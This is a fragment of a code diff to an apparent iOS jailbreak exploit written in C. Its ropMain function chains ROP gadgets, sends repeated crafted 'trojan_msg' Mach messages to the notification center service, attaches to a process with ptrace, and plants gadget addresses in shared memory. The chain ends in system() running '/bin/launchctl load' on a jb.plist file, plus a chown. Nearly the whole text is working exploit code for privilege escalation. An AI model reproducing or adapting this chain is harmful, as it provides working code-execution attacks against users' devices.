-	ropCall2(dscs + _dsc_dlsym, (uint32_t) RTLD_DEFAULT,
-			newString("bootstrap_port"));
-	ropDerefReg0();
-	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // bootstrap_port to PLACE_HOLDER
-	ropCall3(dscs + _dsc_bootstrap_look_up, PLACE_HOLDER,
-			newString("com.apple.system.notification_center"), aPort);
-	ropLog("Looked up notification center\n");
+        Addr aPort = newInteger(0);
+        ropCall2(dscs + _dsc_dlsym, (uint32_t) RTLD_DEFAULT, newString("bootstrap_port"));
+        ropDerefReg0();
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // bootstrap_port to PLACE_HOLDER
+        ropCall3(dscs + _dsc_bootstrap_look_up, PLACE_HOLDER, newString("com.apple.system.notification_center"), aPort);
+        ropLog("Looked up notification center\n");
 
 	// ropPtrace(PT_ATTACH, aPid, 0, 0);
 	ropLoadReg0(aPid);
@@ -563,40 +650,40 @@ int ropMain(int slide) {
 	ropLog("sleeping...");
 	ropCall1(dscs + _dsc_sleep, 1);
 
-	Addr aLocalPort = newInteger(0);
-	Addr aTaskPort = newInteger(0);
-	ropCall0(dscs + _dsc_mach_task_self);
-	ropSaveReg0(aTaskPort);
-	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // taskPort to PLACE_HOLDER
-	ropCall3(dscs + _dsc_mach_port_allocate, PLACE_HOLDER, MACH_PORT_RIGHT_RECEIVE, aLocalPort);
-	ropLoadReg0(aTaskPort);
-	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + ROP_SAVE_REG0_LEN + 0x04); // taskPort to first PLACE_HOLDER
-	ropLoadReg0(aLocalPort);
-	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // localPort to second PLACE_HOLDER
-	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // localPort to third PLACE_HOLDER
-	ropCall4(dscs + _dsc_mach_port_insert_right, PLACE_HOLDER, PLACE_HOLDER, PLACE_HOLDER, MACH_MSG_TYPE_MAKE_SEND);
+        Addr aLocalPort = newInteger(0);
+        Addr aTaskPort = newInteger(0);
+        ropCall0(dscs + _dsc_mach_task_self);
+        ropSaveReg0(aTaskPort);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // taskPort to PLACE_HOLDER
+        ropCall3(dscs + _dsc_mach_port_allocate, PLACE_HOLDER, MACH_PORT_RIGHT_RECEIVE, aLocalPort);
+        ropLoadReg0(aTaskPort);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_LOAD_REG0_LEN + ROP_SAVE_REG0_LEN + ROP_SAVE_REG0_LEN + 0x04); // taskPort to first PLACE_HOLDER
+        ropLoadReg0(aLocalPort);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + ROP_SAVE_REG0_LEN + 0x08); // localPort to second PLACE_HOLDER
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // localPort to third PLACE_HOLDER
+        ropCall4(dscs + _dsc_mach_port_insert_right, PLACE_HOLDER, PLACE_HOLDER, PLACE_HOLDER, MACH_MSG_TYPE_MAKE_SEND);
 
-	struct trojan_msg msg;
+        struct trojan_msg msg;
 
-	msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
-	msg.header.msgh_size = sizeof(msg);
-	msg.header.msgh_id = dscs + GADGET_ADD_SP_120_POP8_10_4567 - 100;
-	msg.pc = dscs + GADGET_MOV_SP_R4_POP8_10_11_4567;
+        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
+        msg.header.msgh_size = sizeof(msg);
+        msg.header.msgh_id = dscs + GADGET_ADD_SP_120_POP8_10_4567 - 100;
+        msg.pc = dscs + GADGET_MOV_SP_R4_POP8_10_11_4567;
 
-	Addr aMsg = newBinary(&msg, sizeof(struct trojan_msg));
-	ropLoadReg0(aPort);
-	ropSaveReg0(aMsg + offsetof(struct trojan_msg, header.msgh_remote_port));
-	ropLoadReg0(aLocalPort);
-	ropSaveReg0(aMsg + offsetof(struct trojan_msg, header.msgh_local_port));
-	ropLoadReg0(aShmAddress);
-	ropSaveReg0(aMsg + offsetof(struct trojan_msg, r4));
+        Addr aMsg = newBinary(&msg, sizeof(struct trojan_msg));
+        ropLoadReg0(aPort);
+        ropSaveReg0(aMsg + offsetof(struct trojan_msg, header.msgh_remote_port));
+        ropLoadReg0(aLocalPort);
+        ropSaveReg0(aMsg + offsetof(struct trojan_msg, header.msgh_local_port));
+        ropLoadReg0(aShmAddress);
+        ropSaveReg0(aMsg + offsetof(struct trojan_msg, r4));
 
-	ropCall7(dscs + _dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
-	ropCall7(dscs + _dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
-	ropCall7(dscs + _dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
-	ropCall7(dscs + _dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
-	ropCall7(dscs + _dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
-	ropCall7(dscs + _dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
+        ropCall7(dscs + _dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
+        ropCall7(dscs + _dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
+        ropCall7(dscs + _dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
+        ropCall7(dscs + _dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
+        ropCall7(dscs + _dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
+        ropCall7(dscs + _dsc_mach_msg, aMsg, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
 
 	// ropPtrace(PT_ATTACH, aPid, 0, 0);
 	ropLoadReg0(aPid);
@@ -608,31 +695,40 @@ int ropMain(int slide) {
 	ropLog("sleeping...");
 	ropCall1(dscs + _dsc_sleep, 1);
 
-	Addr aNotifydStringAddress = newInteger(0);
-	ropLoadReg0(aShmAddress);
-	ropAddReg0Const(0x40);
-	ropSaveReg0(aNotifydStringAddress);
+        Addr aNotifydStringAddress = newInteger(0);
+        ropLoadReg0(aShmAddress);
+        ropAddReg0Const(0x60);
+        ropSaveReg0(aNotifydStringAddress);
 
-	Addr aRacoonStringAddress = newInteger(0);
-	ropLoadReg0(aShmBaseAddress);
-	ropAddReg0Const(0x40);
-	ropSaveReg0(aRacoonStringAddress);
+        Addr aNotifydFileStringAddress = newInteger(0);
+        ropAddReg0Const(sizeof("/bin/launchctl load ") - 1);
+        ropSaveReg0(aNotifydFileStringAddress);
 
-	ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x0C, dscs + _dsc_exit);
-	ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x1C, dscs + GADGET_MOV_LR_R4_MOV_R0_LR_POP47);
-	ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x28, dscs + LIBC_POP_R0123);
-	ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x2C, aNotifydStringAddress);
-	ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x3C, dscs + _dsc_system);
+        Addr aRacoonStringAddress = newInteger(0);
+        ropLoadReg0(aShmBaseAddress);
+        ropAddReg0Const(0x60);
+        ropSaveReg0(aRacoonStringAddress);
 
-	ropLoadReg0(aRacoonStringAddress);
-	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonStringAddress to PLACE_HOLDER
-	ropCall2(dscs + _dsc_strcpy, PLACE_HOLDER,newString("/bin/launchctl load /private/var/root/jb.plist"));
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x0C, dscs + GADGET_MOV_LR_R4_MOV_R0_LR_POP47);
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x1C, dscs + GADGET_MOV_LR_R4_MOV_R0_LR_POP47);
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x20, dscs + _dsc_exit);
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x28, dscs + LIBC_POP_R0123);
+        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x2C, aNotifydFileStringAddress);
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x30, 0x0);
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x34, 0x0);
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x3C, dscs + _dsc_chown);
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x48, dscs + LIBC_POP_R0123);
+        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x4C, aNotifydStringAddress);
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x5C, dscs + _dsc_system);
+
+        ropLoadReg0(aRacoonStringAddress);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonStringAddress to PLACE_HOLDER
+        ropCall2(dscs + _dsc_strcpy, PLACE_HOLDER, newString("/bin/launchctl load /private/var/mobile/Media/jb.plist"));
 
 	// ropPtrace(PT_CONTINUE, aPid, aAddr, 0);
 	ropLoadReg0(aPid);
 	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x08); // aPid to PLACE_HOLDER
-	ropCall4(dscs + _dsc_ptrace, PT_CONTINUE, PLACE_HOLDER, dscs + GADGET_HOLY,
-			0);
+	ropCall4(dscs + _dsc_ptrace, PT_CONTINUE, PLACE_HOLDER, dscs + GADGET_HOLY, 0);
 	ropLog("continuing...\n");
 
 	// ropPtrace(PT_DETACH, aPid, 0, 0); // please???
@@ -652,5 +748,5 @@ int ropMain(int slide) {
 
 	ropClose();
 
-	return 0;
+        return 0;
 }
